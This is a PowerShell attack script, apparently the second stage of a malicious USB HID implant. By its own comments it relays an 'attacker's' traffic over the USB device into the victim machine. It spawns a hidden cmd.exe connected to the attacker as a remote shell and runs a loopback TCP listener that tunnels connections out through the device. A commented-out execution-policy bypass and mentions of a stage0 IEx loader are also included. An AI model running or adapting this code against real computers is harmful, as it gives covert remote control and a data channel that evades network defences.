## This script acts as a multiplexing proxy, forwarding data between incoming
## TCP connections on localhost:65535, and the attackers proxy on the other
## side of the USB device.
##
## It also starts a cmd.exe instance, and connects it to channel 1, to allow the
## attacker to execute other programs to actually make connections to port 65535

## this function is useful for testing purposes, to allow execution within
## powershell_ise, even if the execution policy prohibits execution of scripts
# function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}  Disable-ExecutionPolicy

## It is rather difficult to debug this script when it is run via "IEx", as any
## resulting error messages are rather obscure, and exclude helpful things like
## line numbers, etc. In order to debug this script, then, it can be run
## directly within ISE, or from the command line. It detects this case by the
## existence of the $M or $f variables, which should otherwise be defined by the
## stage0 loader. If they are not defined, open the device ourselves!

if ($M -eq $null) {
	$M = 64
	$cs = '
	using System;
	using System.IO;
	using Microsoft.Win32.SafeHandles;
	using System.Runtime.InteropServices;
	namespace n {
		public class w {
			[DllImport(%kernel32.dll%, CharSet = CharSet.Auto, SetLastError = true)]
			public static extern SafeFileHandle CreateFile(String fn, UInt32 da, Int32 sm, IntPtr sa, Int32 cd, uint fa, IntPtr tf);
			[DllImport(%user32.dll%)]
			public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
			[DllImport(%user32.dll%)]
			public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);

			public static FileStream o(string fn) {
				return new FileStream(CreateFile(fn, 0XC0000000U, 3, IntPtr.Zero, 3, 0x40000000, IntPtr.Zero), FileAccess.ReadWrite, 9, true);
			}
		}
	}
	'.Replace('%',[char]34)
	Add-Type -TypeDefinition $cs
	try {
		$devs = gwmi Win32_USBControllerDevice
		foreach ($dev in $devs) {
			$wmidev = [wmi]$dev.Dependent
			if ($wmidev.GetPropertyValue('DeviceID') -match ('1209&PID_6667') -and ($wmidev.GetPropertyValue('Service') -eq $null)) {
				$fn = ([char]92+[char]92+'?'+[char]92 + $wmidev.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35) + [char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')
			}
		}
		$f = [n.w]::o($fn)
		# $f = (New-Object Net.Sockets.TcpClient("192.168.48.1", 65535)).GetStream()
	} catch {
		echo $_.Exception|format-list -force
	}
}

$Proxy = {
	Param($M, $Device)

	$SYN=1
	$ACK=2
	$FIN=4
	$RST=8

	# Spawn the command with provided arguments, and return the Process
	function spawn($filename, $arguments) {
		$p = New-Object -TypeName System.Diagnostics.Process
		$i = $p.StartInfo
		$i.CreateNoWindow = $true
		$i.UseShellExecute = $false
		$i.RedirectStandardInput = $true
		$i.RedirectStandardOutput = $true
		$i.RedirectStandardError = $true
		$i.FileName = $filename
		$i.Arguments = $arguments
		$null = $p.Start()
		return $p
	}

	function bs($v, $n) { [math]::floor($v * [math]::pow(2, $n)) }
	function sa($s,$a) { (bs ($s -band 15) 4) -bor ($a -band 15)}
	function seq($b) { (bs $b -4) -band 15 }
	function ack($b) { $b -band 15 }

	## The TCB contains the necessary per-channel variables
	function MakeTCB($channel, $ReadStream, $WriteStream) {
		return @{
			Channel = $channel
			ReadStream = $ReadStream
			WriteStream = $WriteStream
			## Making the Stream Read Buffer larger than a single packet can
			## improve throughput. However, it results in multiple packets
			## being sent without waiting for acknowledgement, which has caused
			## lost packets during testing (I think this was the cause, anyway!)
			StreamReadBuff = New-Object Byte[] (($M-4)*1)
			SendSeq = 0
			SendUnack = 0
			Ack = 0
			RecNxt = 0
		}
	}

	## Constructs a packet ready for sending over the USB HID interface
	function MakeHIDPacket($tcb, $flag, $data, $length) {
		# Basic sanity checks
		if ($length -lt 0 -or $length -gt ($M-4)) {
			$length = 0
			[System.Console]::WriteLine("Length out of range: " + $length)
			exit
		}
		# Send Sequence number is incremented iff the packet is SYN/FIN or the packet
		# contains data
		if ((($flag -band $SYN) -eq $SYN) -or (($flag -band $FIN) -eq $FIN) -or $length -gt 0) {
			$tcb.SendSeq++
		}
		$b = @(0, $tcb.Channel, $flag, (sa $tcb.SendSeq $tcb.Ack), $length) + $data[0..$length] + (@(0)*($M-4-$length))

		# more sanity checks
		if ($b.Length -ne ($M+1)) {
			[System.Console]::WriteLine("Invalid length: " + $b.Length)
			[System.Console]::WriteLine("Packet: " + $b)
		}
		return $b
	}

	## Try to avoid printing output on the fast path, console output DESTROYS
	## performance!
	function debugPacket($prefix, $tcb, $packet) {
#		[System.Console]::WriteLine([string]::Format($prefix + "Channel: {0} Flags={1} Seq={2} Ack={3} Length={4}", $packet[1], $packet[2], (seq $packet[3]), (ack $packet[3]), $packet[4]))
	}

	function WriteDevice($tcb, $packet) {
		debugPacket " S: " $tcb $packet
		$device.Write($packet, 0, ($M+1))
	}

	## Read from a Socket or Process InputStream if the Async Read is complete
	## returns $true if the Async Read was complete, $false otherwise
	function ReadSocket($tcb) {
		if ($tcb.StreamReadTask -ne $null -and $tcb.StreamReadTask.IsCompleted) {
			try {
				$r = $tcb.ReadStream.EndRead($tcb.StreamReadTask)
				if ($r -gt 0) { ## If we have data, write it to the HID interface
					$s=0
					while ($r - $s -gt 0) {
						## Funky PS ternary operator idiom follows!
						$l = (($r - $s), ($M-4))[($r-$s) -gt ($M-4)]
						WriteDevice $tcb (MakeHIDPacket $tcb $ACK $tcb.StreamReadBuff[$s..($s+$l-1)] $l)
						$s += $l
					}
					$tcb.StreamReadTask = $tcb.ReadStream.BeginRead($tcb.StreamReadBuff, 0, $tcb.StreamReadBuff.Length, $null, $null)
				} else {        ## The connection is now closed
					WriteDevice $tcb (MakeHIDPacket $tcb $FIN @() 0)
					CleanupTCB $tcb
				}
			} catch {
				[System.Console]::WriteLine("Caught exception reading channel " + $tcb.Channel)
				WriteDevice $tcb (MakeHIDPacket $tcb $FIN @() 0)
				CleanupTCB $tcb
			}
			return $true
		}
		return $false
	}

	function ProcessAck($tcb, $packet) {
		$a = ($tcb.SendUnack+1) -band 15
#		[System.Console]::WriteLine("ProcessAck: TCB SendUnack=" + $tcb.SendUnack + " SendSeq=" + $tcb.SendSeq)
#		[System.Console]::WriteLine("ProcessAck: channel " + $tcb.Channel + " " + $a + ":" + (ack $packet[3]))
		if (ack $packet[3] -eq (($tcb.SendUnack+1) -band 15)) {
			$tcb.SendUnack = ack $packet[3]
		}
	}

	function OpenChannel($channel, $ReadStream, $WriteStream) {
		$tcb = MakeTCB $channel $ReadStream $WriteStream
		[System.Console]::WriteLine("Using TCB channel " + $tcb.Channel)
		WriteDevice $tcb (MakeHIDPacket $tcb $SYN @() 0)
		return $tcb
	}

	function CleanupTCB($tcb) {
		[System.Console]::WriteLine("Cleanup channel " + $tcb.Channel)

		if ($tcb.ReadStream -ne $null) {
			try {
				$tcb.ReadStream.Close()
				$tcb.ReadStream.Dispose()
				$tcb.StreamReadTask = $null
				$tcb.ReadStream = $null

				$tcb.WriteStream.Close()
				$tcb.WriteStream.Dispose()
				$tcb.WriteStream = $null
			} catch {
				echo $_.Exception|format-list -force
			}
		}
	}

	try {
		$conns=New-Object HashTable[] 256

		# Spawn a command prompt on channel 1
		$cmd = spawn "cmd.exe" "/c cmd.exe /k 2>&1 "
		$conns[1] = OpenChannel 1 $cmd.StandardOutput.BaseStream $cmd.StandardInput.BaseStream

		$TcpListener = New-Object Net.Sockets.TcpListener([Net.IPAddress]::Loopback, 65535)
		$TcpListener.Start()
		$ListenerTask = $TcpListener.BeginAcceptTcpClient($null, $null)

		## define two device read buffers, and alternate between them when reading
		## from the HID. This serves two purposes:
		## 1. It allows us to begin the read immediately the previous one finishes
		##    This is important for performance reasons
		## 2. It stops the subsequent read from overwriting data in the buffer before
		##    we are done processing it!
		## 3. It also seems to perform better than just allocating a new buffer each
		##    time
		$db = $true
		$DeviceBuff = New-Object Byte[][] 2
		$DeviceBuff[$db] = New-Object Byte[] ($M+1)
		$DeviceBuff[!$db] = New-Object Byte[] ($M+1)
		$DeviceReadTask = $Device.BeginRead($DeviceBuff[$db], 0, ($M+1), $null, $null)

		[System.Console]::WriteLine("Entering proxy loop")
		while ($true) {
			$loop++
			if ($DeviceReadTask.IsCompleted) {
				$loop = 0
				$l = $Device.EndRead($DeviceReadTask)
				$db = !$db ## Switch buffers
				$DeviceReadTask = $Device.BeginRead($DeviceBuff[$db], 0, ($M+1), $null, $null)
				debugPacket "R: " $tcb $DeviceBuff[!$db]
				if ($l -ne ($M+1)) {
					[System.Console]::WriteLine("Error reading from device, got " + $l + " bytes")
					$TcpListener.Stop()
					exit
				}

				$channel = $DeviceBuff[!$db][1+0]
				$tcb = $conns[$channel]
				$flag = $DeviceBuff[!$db][1+1]
				if ($flag -eq $SYN) {
					# incoming from the other side of the HID, not supported yet
					$tcb = MakeTCB $channel $null $null
					WriteDevice $tcb (MakeHIDPacket $tcb $RST @() 0)
					CleanupTCB $tcb
				} elseif ($tcb -ne $null -band ($flag -eq $FIN -or $flag -eq $RST )) {
					[System.Console]::WriteLine("Flag: " + $flag)
					WriteDevice $tcb (MakeHIDPacket $tcb ($flag -bor $ACK) @() 0)
					CleanupTCB $tcb
				} elseif (($flag -band $ACK) -eq $ACK -and $tcb -ne $null) {
					# If we get a SYN/ACK, we can start reading from the socket
					if (($flag -band $SYN) -eq $SYN) {
						$tcb.Ack = ((seq $DeviceBuff[!$db][1+2]) + 1) -band 15
						$tcb.StreamReadTask = $tcb.ReadStream.BeginRead($tcb.StreamReadBuff, 0, $tcb.StreamReadBuff.Length, $null, $null)
						WriteDevice $tcb (MakeHIDPacket $tcb $ACK @() 0)
					} elseif (($flag -band $FIN) -eq $FIN) { ## Connection closed
						WriteDevice $tcb (MakeHIDPacket $tcb ($FIN -bor $ACK) @() 0)
						$conns[$channel] = $null
						CleanupTCB $tcb
					} elseif ((seq $DeviceBuff[!$db][1+2]) -eq ($tcb.Ack -1) -band 15 -and $DeviceBuff[!$db][1+3] -eq 0) {
						# Empty Ack packet
					} elseif ((seq $DeviceBuff[!$db][1+2]) -eq $tcb.Ack -and $DeviceBuff[!$db][1+3] -gt 0) {
						$tcb.Ack = ($tcb.Ack+1) -band 15
						try {
							$tcb.WriteStream.Write($DeviceBuff[!$db], 1+4, $DeviceBuff[!$db][1+3])
							$tcb.WriteStream.Flush()
							WriteDevice $tcb (MakeHIDPacket $tcb $ACK @() 0)
						} catch {
							WriteDevice $tcb (MakeHIDPacket $tcb $RST @() 0)
							CleanupTCB $tcb
							continue
						}
					} else {
#							[System.Console]::WriteLine("Unhandled packet!")
#							[System.Console]::WriteLine(([Text.Encoding]::ASCII).GetString($DeviceBuff[!$db], 1+4, $DeviceBuff[!$db][1+3]))
					}
				}
			} elseif ($ListenerTask.IsCompleted) {
				$loop = 0
				[System.Console]::WriteLine("Connection received")
				$channel = $null
				for ($c=2; $c -lt 255; $c++) {
					if ($conns[$c] -eq $null) {
						$channel = $c
						break
					}
				}
				[System.Console]::WriteLine("Connect will use channel: " + $channel)
				$client = $TcpListener.EndAcceptTcpClient($ListenerTask)
				if ($channel -eq $null) {
					[System.Console]::WriteLine("No channels available")
					$client.Close()
				} else {
					$tcb = OpenChannel $channel $client.GetStream() $client.GetStream()
					$conns[$channel] = $tcb
				}
				$ListenerTask = $TcpListener.BeginAcceptTcpClient($null, $null)
			} else {
				for ($c=1;$c -lt 256;$c++) {
					if ($conns[$c] -ne $null -and (ReadSocket $conns[$c])) {
						$loop = 0
					}
				}
			}
			## I wish I knew a way to wait on completion of the Async operations in
			## powershell. This spinning uses too much CPU, but we can't sleep too
			## much! :-(
			if ($loop -eq 1000) {
				$loop=0
				Start-Sleep -m 1
			}
		}
	} catch {
		echo $_.Exception|format-list -force
	}

	[System.Console]::Write("Proxy thread completed")
	$cmd.Kill()
	$device.Close()
	$socket.Close()
	exit
}

& $Proxy $M $f
